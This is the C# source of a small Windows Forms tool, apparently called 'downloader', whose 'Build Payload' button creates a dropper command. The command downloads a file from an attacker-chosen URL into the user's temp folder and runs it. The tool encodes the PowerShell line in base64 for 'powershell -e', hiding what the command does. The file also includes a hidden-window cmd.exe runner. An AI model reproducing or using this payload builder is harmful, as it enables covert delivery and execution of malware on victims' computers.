using MetroFramework.Components;
using MetroFramework.Forms;
using MetroFramework;
using System;
using System.Text;
using System.Diagnostics;

namespace downloader
{
    public partial class Form1 : MetroForm
    {
        public Form1()
        {
            InitializeComponent();
            // Initialize MetroStyleManager to set the theme and style
            var styleManager = new MetroStyleManager();
            styleManager.Theme = MetroThemeStyle.Dark;
            styleManager.Style = MetroFramework.MetroColorStyle.Silver;
            styleManager.Owner = this;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Set form properties: not resizable, no maximize button, no minimize button
            this.Resizable = false;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
        }

        private void metroTextBox1_Click(object sender, EventArgs e)
        {
            // Placeholder method, not used
        }

        private void buildpayload_Click(object sender, EventArgs e)
        {
            // Method called when "Build Payload" button is clicked
            // Get input values
            string new_filename = filename_payload.Text;
            string url = payloadlink.Text;

            // Generate a random string
            string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            string randomString = "";
            Random random = new Random();
            for (int i = 0; i < 10; i++)
            {
                randomString += characters[random.Next(characters.Length)];
            }

            // Construct PowerShell command
            string powerShellCommand = "";
            powerShellCommand += $"$url='{url}';$outputPath=$env:TEMP+'\\{new_filename}';(New-Object Net.WebClient).DownloadFile($url,$outputPath);Start-Process $outputPath;";
            // Convert PowerShell command to base64
            byte[] bytes = Encoding.Unicode.GetBytes(powerShellCommand);
            string base64Payload = Convert.ToBase64String(bytes);
            powerShellCommand = "powershell -e " + base64Payload;

            // Open payload window and execute PowerShell command
            payload_window form2 = new payload_window(powerShellCommand);
            form2.ShowDialog();
        }

        private void ExecuteCommand(string command)
        {
            // Execute command using cmd.exe
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;
            processStartInfo.CreateNoWindow = true;

            using (Process process = new Process())
            {
                process.StartInfo = processStartInfo;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();
            }
        }

        private void aboutbtn_Click(object sender, EventArgs e)
        {
            // Method called when "About" button is clicked to show about window
            about_window form3 = new about_window();
            form3.ShowDialog();
        }
    }
}